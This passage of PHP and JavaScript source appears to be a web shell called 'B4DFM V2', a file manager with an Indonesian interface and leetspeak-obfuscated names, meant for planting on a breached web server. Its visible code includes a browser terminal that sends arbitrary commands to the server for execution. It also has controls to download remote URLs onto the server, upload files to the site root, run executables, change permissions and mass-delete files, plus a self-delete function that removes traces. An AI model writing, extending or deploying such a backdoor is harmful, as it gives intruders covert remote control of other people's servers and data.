                $size = $is_dir ? '-' : hUm4n_r34d4bl3_s1z3(filesize($item_path));
                $file_perms = fileperms($item_path);
                $permission_octal = substr(sprintf('%o', $file_perms), -4);
                $permission_symbolic = get_symbolic_permissions($file_perms);
                $is_writable = is_writable($item_path);
                $last_modified = date("Y-m-d H:i:s", filemtime($item_path));
                
                $file_class = get_file_classification($item);

                $d1r_c0nt3nts[] = [
                    'name' => $item,
                    'path' => $item_path,
                    'is_dir' => $is_dir,
                    'type' => $type,
                    'size_raw' => $is_dir ? -1 : filesize($item_path),
                    'size' => $size,
                    'permission_octal_raw' => decoct($file_perms & 0777),
                    'permission_octal' => $permission_octal,
                    'permission_symbolic' => $permission_symbolic,
                    'is_writable' => $is_writable,
                    'is_executable' => $file_class['is_executable'],
                    'is_binary' => $file_class['is_binary'],
                    'date_raw' => filemtime($item_path),
                    'date' => $last_modified
                ];
            }
        } else {
            echo '<tr><td colspan="7" class="text-center perm-color-red">Gagal membaca direktori. Periksa izin.</td></tr>';
        }

        usort($d1r_c0nt3nts, function($a, $b) {
            if ($a['is_dir'] && !$b['is_dir']) return -1;
            if (!$a['is_dir'] && $b['is_dir']) return 1;
            return strcasecmp($a['name'], $b['name']);
        });

        if (realpath($curr_D1r) !== realpath('/')) {
            array_unshift($d1r_c0nt3nts, [
                'name' => '..',
                'path' => dirname($curr_D1r),
                'is_dir' => true,
                'type' => 'Folder',
                'size_raw' => -1, 'size' => '-',
                'permission_octal_raw' => '0000', 'permission_octal' => '----',
                'permission_symbolic' => '---------', 'is_writable' => false,
                'is_executable' => false, 'is_binary' => false,
                'date_raw' => 0, 'date' => ''
            ]);
        }

        function hUm4n_r34d4bl3_s1z3($bYt3s, $d1g1ts = 2) {
            $s1z3s = array('B', 'KB', 'MB', 'GB', 'TB');
            $f4ct0r = floor((strlen($bYt3s) - 1) / 3);
            return sprintf("%.{$d1g1ts}f", $bYt3s / pow(1024, $f4ct0r)) . @$s1z3s[$f4ct0r];
        }

        foreach ($d1r_c0nt3nts as $item_d4t4) {
            $perm_color_class = $item_d4t4['is_writable'] ? 'perm-color-green' : 'perm-color-red';
            if ($item_d4t4['name'] === '..') $perm_color_class = 'text-gray-500';

            echo '<tr>';
            echo '<td>';
            if ($item_d4t4['name'] !== '..') {
                echo '<input type="checkbox" data-item-name="' . htmlentities($item_d4t4['name']) . '" class="item-checkbox h-4 w-4 text-blue-600 rounded-md">';
            }
            echo '</td>';
            echo '<td>';
            if ($item_d4t4['is_dir']) {
                echo '<i class="file-icon folder material-icons-outlined">folder</i> <a href="?' . $pk . '=' . urlencode($item_d4t4['path']) . '" style="color:#3d7fff;">' . htmlentities($item_d4t4['name']) . '</a>';
            } else {
                echo '<i class="file-icon file material-icons-outlined">insert_drive_file</i> ' . htmlentities($item_d4t4['name']);
            }
            echo '</td>';
            echo '<td>' . htmlentities($item_d4t4['type']) . '</td>';
            echo '<td>' . htmlentities($item_d4t4['size']) . '</td>';
            echo '<td class="' . $perm_color_class . '">' . htmlentities($item_d4t4['permission_octal']) . ' (' . htmlentities($item_d4t4['permission_symbolic']) . ')</td>';
            echo '<td>' . htmlentities($item_d4t4['date']) . '</td>';
            echo '<td class="file-actions">';
            if ($item_d4t4['name'] !== '..') {
                echo '<button class="action-btn" title="Rename" onclick="sh0w_r3n4m3_d1al0g(\'' . urlencode($item_d4t4['name']) . '\', ' . ($item_d4t4['is_dir'] ? 'true' : 'false') . ')"><i class="material-icons-outlined">drive_file_rename_outline</i></button>';
                echo '<button class="action-btn" title="CHMOD" onclick="sh0w_ch4ng3_p3rm_d1al0g(\'' . urlencode($item_d4t4['name']) . '\', \'' . $item_d4t4['permission_octal_raw'] . '\')"><i class="material-icons-outlined">lock_open</i></button>';
                echo '<button class="action-btn" title="Delete" onclick="d3l3t3_fnc(\'' . urlencode($item_d4t4['name']) . '\', ' . ($item_d4t4['is_dir'] ? 'true' : 'false') . ')"><i class="material-icons-outlined">delete</i></button>';

                if (!$item_d4t4['is_dir']) {
                    echo '<button class="action-btn" title="View" onclick="v13w_f1l3_c0nt3nt(\'' . urlencode($item_d4t4['name']) . '\')"><i class="material-icons-outlined">visibility</i></button>';
                    echo '<button class="action-btn" title="Edit" onclick="edit_f1l3_c0nt3nt(\'' . urlencode($item_d4t4['name']) . '\')"><i class="material-icons-outlined">edit</i></button>';
                    if ($item_d4t4['is_executable']) {
                        echo '<button class="action-btn" title="Run" onclick="run_file(\'' . urlencode($item_d4t4['name']) . '\')"><i class="material-icons-outlined">play_arrow</i></button>';
                    }
                }
            }
            echo '</td>';
            echo '</tr>';
        }
        ?>
      </tbody>
    </table>

    <div class="bottom-copyright">
      &copy; 2025 | PaulIntern | B4DFM V2
    </div>
  </main>
</div>

<div id="mass_delete_bar" class="mass-delete-bar">
    <span id="selected_items_count">0 item selected</span>
    <button onclick="mass_d3l3t3_fnc()"><i class="material-icons-outlined">delete</i> Delete Selected</button>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.5/codemirror.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.5/mode/javascript/javascript.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.5/mode/xml/xml.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.5/mode/css/css.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.5/mode/htmlmixed/htmlmixed.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.5/mode/php/php.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.5/mode/clike/clike.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.5/mode/markdown/markdown.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.5/mode/sql/sql.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.5/mode/shell/shell.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.5/addon/edit/matchbrackets.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.5/addon/comment/comment.min.js"></script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/php.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/javascript.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/xml.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/css.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/json.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/markdown.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/sql.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/bash.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/c.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/cpp.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/python.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/perl.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/java.min.js"></script>


<script>
    const pk_JS = '<?php echo $pk; ?>';
    const ak_JS = '<?php echo $ak; ?>';
    const dk_JS = '<?php echo $dk; ?>';
    const tk_JS = '<?php echo $tk; ?>';
    const s3ss10n_t0k3n_JS = '<?php echo $_SESSION[$tk]; ?>';
    const curr_D1r_JS = '<?php echo addslashes($curr_D1r); ?>';

    const l0ad1ng_0v3rl4y = document.getElementById('loading_overlay');
    const massDeleteBar = document.getElementById('mass_delete_bar');
    const selectedItemsCountSpan = document.getElementById('selected_items_count');
    const selectAllCheckbox = document.getElementById('select_all_items');
    const themeToggleBtn = document.getElementById('theme-toggle-btn');
    const themeToggleIcon = document.getElementById('theme-toggle-icon');

    function sh0w_l0ad1ng() {
        l0ad1ng_0v3rl4y.classList.add('show');
    }

    function h1d3_l0ad1ng() {
        l0ad1ng_0v3rl4y.classList.remove('show');
    }

    // Theme Toggle Functionality
    function toggleTheme() {
        document.body.classList.toggle('dark-mode');
        if (document.body.classList.contains('dark-mode')) {
            localStorage.setItem('theme', 'dark');
            themeToggleIcon.innerText = 'light_mode';
        } else {
            localStorage.setItem('theme', 'light');
            themeToggleIcon.innerText = 'dark_mode';
        }
    }

    // Apply saved theme on load
    document.addEventListener('DOMContentLoaded', () => {
        const savedTheme = localStorage.getItem('theme');
        if (savedTheme === 'dark') {
            document.body.classList.add('dark-mode');
            themeToggleIcon.innerText = 'light_mode';
        } else {
            document.body.classList.remove('dark-mode');
            themeToggleIcon.innerText = 'dark_mode';
        }
    });

    async function s3nd_r3qu3st(action, d4t4_p4yl04d, f1l3_obj = null) {
        sh0w_l0ad1ng();
        const f0rm_d4t4 = new FormData();
        f0rm_d4t4.append(ak_JS, action);
        f0rm_d4t4.append(dk_JS, JSON.stringify({...d4t4_p4yl04d, curr_p4th: curr_D1r_JS}));
        f0rm_d4t4.append(tk_JS, s3ss10n_t0k3n_JS);

        if (f1l3_obj) {
            f0rm_d4t4.append('f1l3_t0_upL04d', f1l3_obj);
        }

        try {
            const r3s = await fetch(window.location.href, {
                method: 'POST',
                body: f0rm_d4t4,
                headers: {
                    'X-Requested-With': 'XMLHttpRequest'
                }
            });
            const jS0n_r3s = await r3s.json();
            h1d3_l0ad1ng();
            return jS0n_r3s;
        } catch (err) {
            h1d3_l0ad1ng();
            Swal.fire({
                title: '<i class="fas fa-times-circle perm-color-red mr-2"></i> Error Jaringan!',
                html: `Terjadi kesalahan jaringan atau server tidak merespons: <pre class="swal2-html-container">${htmlentities(err.message)}</pre>`,
                icon: 'error',
                showConfirmButton: true 
            });
            return { status: 'error', m3ss4g3: `Terjadi kesalahan jaringan atau server: ${err.message}` };
        }
    }

    function clear_l0g_fnc() {
        Swal.fire({
            title: '<i class="material-icons-outlined">delete_forever</i> Clear Log',
            text: 'Ini hanya membersihkan log di browser Anda (console).',
            icon: 'info',
            showCancelButton: true,
            confirmButtonText: 'Ya, bersihkan!',
            cancelButtonText: 'Batal'
        }).then((r3sult) => {
            if (r3sult.isConfirmed) {
                console.clear();
                Swal.fire({
                    title: '<i class="fas fa-check-circle perm-color-green mr-2"></i> Selesai!',
                    text: 'Log browser telah dibersihkan.',
                    icon: 'success',
                    showConfirmButton: true 
                });
            } 
        });
    }

    function k1ll_s3ss10n_fnc() {
        Swal.fire({
            title: '<i class="material-icons-outlined">cancel</i> Kill Session',
            text: 'Ini akan mengakhiri sesi Anda saat ini. Anda perlu login lagi.',
            icon: 'warning',
            showCancelButton: true,
            confirmButtonColor: '#dc3545',
            cancelButtonColor: '#6c757d',
            confirmButtonText: 'Ya, matikan!',
            cancelButtonText: 'Batal'
        }).then((r3sult) => {
            if (r3sult.isConfirmed) {
                window.location.href = `?k1ll_s3ss10n_k3y=true`;
            } 
        });
    }

    async function self_d3l3t3_fnc() {
        const r3sult = await Swal.fire({
            title: '<i class="material-icons-outlined">auto_delete</i> Hapus File Manager?',
            text: 'Ini akan menghapus file manager ini dari server. Aksi ini tidak dapat dibatalkan!',
            icon: 'warning',
            showCancelButton: true,
            confirmButtonColor: '#dc3545',
            cancelButtonColor: '#6c757d',
            confirmButtonText: 'Ya, Hapus Sekarang!',
            cancelButtonText: 'Batal'
        });

        if (r3sult.isConfirmed) {
            const r3s = await s3nd_r3qu3st('self_d3l3t3', {});
            Swal.fire(r3s.status === 'success' ? {
                title: '<i class="fas fa-check-circle perm-color-green mr-2"></i> Berhasil!',
                text: r3s.m3ss4g3,
                icon: 'success',
                showConfirmButton: true
            } : {
                title: '<i class="fas fa-times-circle perm-color-red mr-2"></i> Gagal!',
                text: r3s.m3ss4g3,
                icon: 'error',
                showConfirmButton: true
            }).then(() => {
                if (r3s.status === 'success') {
                    window.location.href = '/';
                }
            });
        }
    }

    function updateTime() {
        const now = new Date();
        document.getElementById('servertime').textContent =
            now.toLocaleTimeString('en-US', { timeZone: 'Asia/Jakarta', hour12: false });
    }
    setInterval(updateTime, 1000);
    updateTime();

    function t0ggl3_sYs_1nf0() {
        const sYs_1nf0_d1v = document.getElementById('sYs_1nf0_s3ct');
        if (sYs_1nf0_d1v.style.display === 'none' || sYs_1nf0_d1v.style.display === '') {
            sYs_1nf0_d1v.style.display = 'block';
        } else {
            sYs_1nf0_d1v.style.display = 'none';
        }
    }

    async function sh0w_cr34t3_f0ld3r_d1al0g() {
        const { value: v4l, dismiss } = await Swal.fire({
            title: '<i class="material-icons-outlined">create_new_folder</i> New Folder',
            input: 'text',
            inputPlaceholder: 'Nama folder baru...',
            showCancelButton: true,
            confirmButtonText: 'Buat',
            cancelButtonText: 'Batal',
            inputValidator: (v4lue) => {
                if (!v4lue) {
                    return 'Nama folder tidak boleh kosong!';
                }
                if (/[^a-zA-Z0-9_\-\. ]/.test(v4lue)) {
                    return 'Nama folder mengandung karakter yang tidak diizinkan!';
                }
            }
        });
        if (dismiss) return;

        if (v4l) {
            const r3s = await s3nd_r3qu3st('cr34t3_f0ld3r', { n4m3: v4l });
            Swal.fire(r3s.status === 'success' ? {
                title: '<i class="fas fa-check-circle perm-color-green mr-2"></i> Berhasil!',
                text: r3s.m3ss4g3,
                icon: 'success',
                showConfirmButton: true
            } : {
                title: '<i class="fas fa-times-circle perm-color-red mr-2"></i> Gagal!',
                text: r3s.m3ss4g3,
                icon: 'error',
                showConfirmButton: true
            }).then(() => {
                if (r3s.status === 'success') location.reload();
            });
        }
    }

    async function sh0w_cr34t3_f1l3_d1al0g() {
        const { value: f1l3_n4m3, dismiss: dismissName } = await Swal.fire({
            title: '<i class="material-icons-outlined">note_add</i> New File',
            input: 'text',
            inputPlaceholder: 'Nama file baru...',
            showCancelButton: true,
            confirmButtonText: 'Next',
            cancelButtonText: 'Batal',
            inputValidator: (v4lue) => {
                if (!v4lue) {
                    return 'Nama file tidak boleh kosong!';
                }
                if (/[^a-zA-Z0-9_\-\. ]/.test(v4lue)) {
                    return 'Nama file mengandung karakter yang tidak diizinkan!';
                }
            }
        });
        if (dismissName) return;

        if (f1l3_n4m3) {
            const { value: f1l3_c0nt3nt, dismiss: dismissContent } = await Swal.fire({
                title: `<i class="material-icons-outlined">edit</i> Content for ${f1l3_n4m3}`,
                input: 'textarea',
                inputPlaceholder: 'Masukkan isi file...',
                showCancelButton: true,
                confirmButtonText: 'Buat File',
                cancelButtonText: 'Batal',
                inputAutoTrim: false
            });
            if (dismissContent) return;

            if (f1l3_c0nt3nt !== undefined) {
                const r3s = await s3nd_r3qu3st('cr34t3_f1l3', { n4m3: f1l3_n4m3, c0nt3nt: f1l3_c0nt3nt });
                Swal.fire(r3s.status === 'success' ? {
                    title: '<i class="fas fa-check-circle perm-color-green mr-2"></i> Berhasil!',
                    text: r3s.m3ss4g3,
                    icon: 'success',
                    showConfirmButton: true
                } : {
                    title: '<i class="fas fa-times-circle perm-color-red mr-2"></i> Gagal!',
                    text: r3s.m3ss4g3,
                    icon: 'error',
                    showConfirmButton: true
                }).then(() => {
                    if (r3s.status === 'success') location.reload();
                });
            }
        }
    }

    async function sh0w_upL04d_d1al0g() {
        const { value: upload_type, dismiss: dismissType } = await Swal.fire({
            title: '<i class="material-icons-outlined">upload_file</i> Upload File',
            text: 'Pilih lokasi upload:',
            input: 'radio',
            inputOptions: {
                'current_dir': 'Direktori Saat Ini',
                'root_dir': 'Root Directory Website'
            },
            inputValue: 'current_dir',
            showCancelButton: true,
            confirmButtonText: 'Pilih',
            cancelButtonText: 'Batal',
            inputValidator: (value) => {
                if (!value) return 'Anda harus memilih lokasi upload!';
            }
        });
        if (dismissType) return;

        if (upload_type) {
            const { value: f1l3_t0_upL04d, dismiss: dismissFile } = await Swal.fire({
                title: `<i class="material-icons-outlined">cloud_upload</i> Upload ke ${upload_type === 'current_dir' ? 'Direktori Saat Ini' : 'Root Directory Website'}`,
                input: 'file',
                inputAttributes: {
                    'accept': '*',
                    'aria-label': 'Upload your file'
                },
                showCancelButton: true,
                confirmButtonText: 'Upload',
                cancelButtonText: 'Batal'
            });
            if (dismissFile) return;

            if (f1l3_t0_upL04d) {
                const action = (upload_type === 'current_dir') ? 'upL04d_f1l3' : 'upL04d_f1l3_root';
                const r3s = await s3nd_r3qu3st(action, {}, f1l3_t0_upL04d);
                Swal.fire(r3s.status === 'success' ? {
                    title: '<i class="fas fa-check-circle perm-color-green mr-2"></i> Berhasil!',
                    text: r3s.m3ss4g3,
                    icon: 'success',
                    showConfirmButton: true
                } : {
                    title: '<i class="fas fa-times-circle perm-color-red mr-2"></i> Gagal!',
                    text: r3s.m3ss4g3,
                    icon: 'error',
                    showConfirmButton: true
                }).then(() => {
                    if (r3s.status === 'success') location.reload();
                });
            }
        }
    }

    async function sh0w_c0mm4nd_d1al0g() {
        let commandOutputHistory = "";

        const terminalSwal = await Swal.fire({
            title: '<i class="material-icons-outlined">terminal</i> Terminal CMD',
            html: `
                <div id="terminal-output" class="swal2-html-container h-64 overflow-auto" style="background: #2a2a2a; color: #e0e0e0; padding: 15px; border-radius: 8px; font-family: monospace; text-align: left; margin-bottom: 15px;">
                    <span style="color:#48bb78;">$</span> _
                </div>
                <input id="terminal-input" class="swal2-input" placeholder="Masukkan perintah..." style="background: #f4f6fb; color: #333; border: 1px solid #ccc; padding: 10px; border-radius: 4px;">
            `,
            width: '90vw',
            showConfirmButton: false, 
            showCancelButton: true,
            cancelButtonText: 'Tutup',
            allowOutsideClick: false,
            allowEscapeKey: false,
            didOpen: () => {
                const outputElem = document.getElementById('terminal-output');
                const inputElem = document.getElementById('terminal-input');
                inputElem.focus();

                inputElem.addEventListener('keydown', async (event) => {
                    if (event.key === 'Enter') {
                        event.preventDefault();
                        const currentCommand = inputElem.value;
                        inputElem.value = '';

                        if (currentCommand.trim() === '') {
                            outputElem.innerHTML += `<br><span style="color:#48bb78;">$</span> _`;
                            outputElem.scrollTop = outputElem.scrollHeight;
                            return;
                        }

                        outputElem.innerHTML += `<br><span style="color:#48bb78;">$</span> ${htmlentities(currentCommand)}`;
                        outputElem.scrollTop = outputElem.scrollHeight;
                        
                        const r3s = await s3nd_r3qu3st('3x3c_c0mm4nd', { c0mm4nd: currentCommand });
                        if (r3s.status === 'success') {
                            outputElem.innerHTML += `<br><span style="color:#e0e0e0;">${htmlentities(r3s.commandOutput)}</span><br><span style="color:#48bb78;">$</span> _`;
                        } else {
                            outputElem.innerHTML += `<br><span style="color:#e53e3e;">Error: ${htmlentities(r3s.m3ss4g3)}</span><br><span style="color:#48bb78;">$</span> _`;
                        }
                        outputElem.scrollTop = outputElem.scrollHeight;
                    }
                });
            }
        });
    }

    async function sh0w_cUrL_d0wnl0ad_d1al0g() {
        const { value: url, dismiss: dismissUrl } = await Swal.fire({
            title: '<i class="material-icons-outlined">file_download</i> Curl Download',
            input: 'url',
            inputPlaceholder: 'URL file yang akan diunduh (misal: http://example.com/file.zip)',
            showCancelButton: true,
            confirmButtonText: 'Next',
            cancelButtonText: 'Batal',
            inputValidator: (v4lue) => {
                if (!v4lue || !v4lue.startsWith('http')) {
                    return 'Masukkan URL yang valid!';
                }
            }
        });
        if (dismissUrl) return;

        if (url) {
            const d3f4ult_n4m3 = url.substring(url.lastIndexOf('/') + 1) || 'downloaded_file';
            const { value: s4v3_n4m3, dismiss: dismissSaveName } = await Swal.fire({
                title: `<i class="material-icons-outlined">save</i> Save Downloaded File`,
                input: 'text',
                inputPlaceholder: 'Simpan sebagai (nama file)...',
                inputValue: d3f4ult_n4m3,
                showCancelButton: true,
                confirmButtonText: 'Download',
                cancelButtonText: 'Batal',
                inputValidator: (v4lue) => {
                    if (!v4lue) {
                        return 'Nama file tidak boleh kosong!';
                    }
                    if (/[^a-zA-Z0-9_\-\. ]/.test(v4lue)) {
                        return 'Nama file mengandung karakter yang tidak diizinkan!';
                    }
                }
            });
            if (dismissSaveName) return;

            if (s4v3_n4m3) {
                const r3s = await s3nd_r3qu3st('cUrL_d0wnl0ad', { url: url, s4v3_n4m3: s4v3_n4m3 });
                Swal.fire(r3s.status === 'success' ? {
                    title: '<i class="fas fa-check-circle perm-color-green mr-2"></i> Berhasil!',
                    text: r3s.m3ss4g3,
                    icon: 'success',
                    showConfirmButton: true
                } : {
                    title: '<i class="fas fa-times-circle perm-color-red mr-2"></i> Gagal!',
                    text: r3s.m3ss4g3,
                    icon: 'error',
                    showConfirmButton: true
                }).then(() => {
                    if (r3s.status === 'success') location.reload();
                });
            }
        }
    }

    async function sh0w_z1p_3xtr4ct_d1al0g() {
        const { value: source_type, dismiss: dismissSourceType } = await Swal.fire({
            title: '<i class="material-icons-outlined">archive</i> Zip Extractor',
            text: 'Pilih sumber file ZIP:',
            input: 'radio',
            inputOptions: {
                'existing_file': 'File ZIP yang sudah ada di server',
                'upload_new': 'Upload file ZIP baru'
            },
            inputValue: 'existing_file',
            showCancelButton: true,
            confirmButtonText: 'Next',
            cancelButtonText: 'Batal',
            inputValidator: (value) => {
                if (!value) return 'Anda harus memilih sumber file ZIP!';
            }
        });
        if (dismissSourceType) return;

        let zip_file_name;
        let file_obj = null;

        if (source_type === 'existing_file') {
            const { value: name, dismiss: dismissName } = await Swal.fire({
                title: '<i class="material-icons-outlined">archive</i> Nama File ZIP',
                input: 'text',
                inputPlaceholder: 'Nama file ZIP (misal: archive.zip)',
                showCancelButton: true,
                confirmButtonText: 'Next',
                cancelButtonText: 'Batal',
                inputValidator: (v4lue) => {
                    if (!v4lue) return 'Nama file ZIP tidak boleh kosong!';
                    if (!v4lue.toLowerCase().endsWith('.zip')) return 'Nama file harus berekstensi .zip!';
                }
            });
            if (dismissName) return;
            if (!name) return;
            zip_file_name = name;
        } else { 
            const { value: file, dismiss: dismissFile } = await Swal.fire({
                title: '<i class="material-icons-outlined">cloud_upload</i> Upload File ZIP',
                input: 'file',
                inputAttributes: {
                    'accept': '.zip',
                    'aria-label': 'Upload your ZIP file'
                },
                showCancelButton: true,
                confirmButtonText: 'Upload & Next',
                cancelButtonText: 'Batal',
                inputValidator: (file) => {
                    if (!file) return 'Anda harus memilih file ZIP!';
                    if (!file.name.toLowerCase().endsWith('.zip')) return 'Hanya file .zip yang diizinkan!';
                }
            });
            if (dismissFile) return;
            if (!file) return;
            file_obj = file;
            zip_file_name = file.name; 
        }

        const { value: d3st_f0ld3r, dismiss: dismissDestFolder } = await Swal.fire({
            title: `<i class="material-icons-outlined">folder_open</i> Extract ${zip_file_name} To`,
            input: 'text',
            inputPlaceholder: 'Direktori tujuan (kosong untuk direktori saat ini)',
            inputValue: zip_file_name.replace(/\.zip$/i, '') || '',
            showCancelButton: true,
            confirmButtonText: 'Extract',
            cancelButtonText: 'Batal',
            inputValidator: (v4lue) => {
                if (/[^a-zA-Z0-9_\-\. ]/.test(v4lue)) {
                    return 'Nama folder mengandung karakter yang tidak diizinkan!';
                }
            }
        });
        if (dismissDestFolder) return;

        if (d3st_f0ld3r !== undefined) {
            let r3s;
            if (file_obj) {
                r3s = await s3nd_r3qu3st('upL04d_f1l3', {}, file_obj); 
                if (r3s.status !== 'success') {
                    Swal.fire({
                        title: '<i class="fas fa-times-circle perm-color-red mr-2"></i> Gagal Upload ZIP!',
                        text: r3s.m3ss4g3,
                        icon: 'error',
                        showConfirmButton: true
                    });
                    return;
                }
            }
            
            r3s = await s3nd_r3qu3st('z1p_3xtr4ct', { f1l3: zip_file_name, d3st_f0ld3r: d3st_f0ld3r || '.' });
            Swal.fire(r3s.status === 'success' ? {
                title: '<i class="fas fa-check-circle perm-color-green mr-2"></i> Berhasil!',
                text: r3s.m3ss4g3,
                icon: 'success',
                showConfirmButton: true
            } : {
                title: '<i class="fas fa-times-circle perm-color-red mr-2"></i> Gagal!',
                text: r3s.m3ss4g3,
                icon: 'error',
                showConfirmButton: true
            }).then(() => {
                if (r3s.status === 'success') location.reload();
            });
        }
    }

    async function sh0w_r3n4m3_d1al0g(old_name_enc, is_d1r) {
        const old_name = decodeURIComponent(old_name_enc);
        const { value: v4l, dismiss } = await Swal.fire({
            title: `<i class="material-icons-outlined">drive_file_rename_outline</i> Rename ${is_d1r ? 'Folder' : 'File'}`,
            input: 'text',
            inputValue: old_name,
            showCancelButton: true,
            confirmButtonText: 'Rename',
            cancelButtonText: 'Batal',
            inputValidator: (v4lue) => {
                if (!v4lue) {
                    return 'Nama tidak boleh kosong!';
                }
                if (/[^a-zA-Z0-9_\-\. ]/.test(v4lue)) {
                    return 'Nama mengandung karakter yang tidak diizinkan!';
                }
                if (v4lue === old_name) {
                    return 'Nama baru harus berbeda dari nama lama!';
                }
            }
        });
        if (dismiss) return;

        if (v4l) {
            const r3s = await s3nd_r3qu3st('r3n4m3_1t3m', { '0ld_n4m3': old_name, 'n3w_n4m3': v4l });
            Swal.fire(r3s.status === 'success' ? {
                title: '<i class="fas fa-check-circle perm-color-green mr-2"></i> Berhasil!',
                text: r3s.m3ss4g3,
                icon: 'success',
                showConfirmButton: true
            } : {
                title: '<i class="fas fa-times-circle perm-color-red mr-2"></i> Gagal!',
                text: r3s.m3ss4g3,
                icon: 'error',
                showConfirmButton: true
            }).then(() => {
                if (r3s.status === 'success') location.reload();
            });
        }
    }

    async function sh0w_ch4ng3_p3rm_d1al0g(n4m3_enc, curr_p3rm) {
        const n4m3 = decodeURIComponent(n4m3_enc);
        const { value: v4l, dismiss } = await Swal.fire({
            title: `<i class="material-icons-outlined">lock_open</i> Change Permissions for ${n4m3}`,
            input: 'text',
            inputValue: curr_p3rm,
            inputPlaceholder: 'Enter new permissions (e.g., 0755)',
            showCancelButton: true,
            confirmButtonText: 'Change',
            cancelButtonText: 'Batal',
            inputValidator: (v4lue) => {
                if (!/^[0-7]{4}$/.test(v4lue)) {
                    return 'Format permission tidak valid (misal: 0755)!';
                }
            }
        });
        if (dismiss) return;

        if (v4l) {
            const r3s = await s3nd_r3qu3st('ch4ng3_p3rm', { n4m3: n4m3, p3rm: v4l });
            Swal.fire(r3s.status === 'success' ? {
                title: '<i class="fas fa-check-circle perm-color-green mr-2"></i> Berhasil!',
                text: r3s.m3ss4g3,
                icon: 'success',
                showConfirmButton: true
            } : {
                title: '<i class="fas fa-times-circle perm-color-red mr-2"></i> Gagal!',
                text: r3s.m3ss4g3,
                icon: 'error',
                showConfirmButton: true
            }).then(() => {
                if (r3s.status === 'success') location.reload();
            });
        }
    }

    async function d3l3t3_fnc(n4m3_enc, is_d1r) {
        const n4m3 = decodeURIComponent(n4m3_enc);
        const r3sult = await Swal.fire({
            title: `<i class="material-icons-outlined">delete</i> Are you sure?`,
            text: `Anda akan menghapus ${is_d1r ? 'folder' : 'file'} "${n4m3}". Aksi ini akan menghapus folder beserta isinya dan tidak dapat dibatalkan!`,
            icon: 'warning',
            showCancelButton: true,
            confirmButtonColor: '#dc3545',
            cancelButtonColor: '#6c757d',
            confirmButtonText: 'Ya, hapus!',
            cancelButtonText: 'Batal'
        });

        if (r3sult.isConfirmed) {
            const r3s = await s3nd_r3qu3st('d3l3t3_1t3m', { n4m3: n4m3 });
            Swal.fire(r3s.status === 'success' ? {
                title: '<i class="fas fa-check-circle perm-color-green mr-2"></i> Berhasil!',
                text: r3s.m3ss4g3,
                icon: 'success',
                showConfirmButton: true
            } : {
                title: '<i class="fas fa-times-circle perm-color-red mr-2"></i> Gagal!',
                text: r3s.m3ss4g3,
                icon: 'error',
                showConfirmButton: true
            }).then(() => {
                if (r3s.status === 'success') location.reload();
            });
        }
    }

    async function mass_d3l3t3_fnc() {
        const selectedItems = Array.from(document.querySelectorAll('.item-checkbox'))
            .filter(cb => cb.checked)
            .map(cb => cb.dataset.itemName);
        
        if (selectedItems.length === 0) {
            Swal.fire({
                title: '<i class="fas fa-info-circle mr-2"></i> Info',
                text: 'Tidak ada item yang dipilih untuk dihapus.',
                icon: 'info',
                showConfirmButton: true
            });
            return;
        }

        const r3sult = await Swal.fire({
            title: `<i class="material-icons-outlined">delete</i> Hapus ${selectedItems.length} Item yang Dipilih?`,
            text: `Anda akan menghapus item berikut:\n${selectedItems.join('\n')}\n\nAksi ini akan menghapus folder beserta isinya dan tidak dapat dibatalkan!`,
            icon: 'warning',
            showCancelButton: true,
            confirmButtonColor: '#dc3545',
            cancelButtonColor: '#6c757d',
            confirmButtonText: 'Ya, Hapus Massal!',
            cancelButtonText: 'Batal',
            customClass: {
                htmlContainer: 'swal2-html-container'
            }
        });

        if (r3sult.isConfirmed) {
            const r3s = await s3nd_r3qu3st('mass_d3l3t3', { items: selectedItems });
            Swal.fire(r3s.status === 'success' ? {
                title: '<i class="fas fa-check-circle perm-color-green mr-2"></i> Berhasil!',
                text: r3s.m3ss4g3,
                icon: 'success',
                showConfirmButton: true
            } : {
                title: '<i class="fas fa-times-circle perm-color-red mr-2"></i> Gagal!',
                text: r3s.m3ss4g3,
                icon: 'error',
                showConfirmButton: true
            }).then(() => {
                if (r3s.status === 'success') location.reload();
            });
        }
    }

    function getFileEditorConfig(filename) {
        const extension = filename.split('.').pop().toLowerCase();
        let cmMode = 'text/plain';
        let hljsLang = 'plaintext';
        let isNonEditable = false;
        let isExecutable = false;

        const cmModes = {
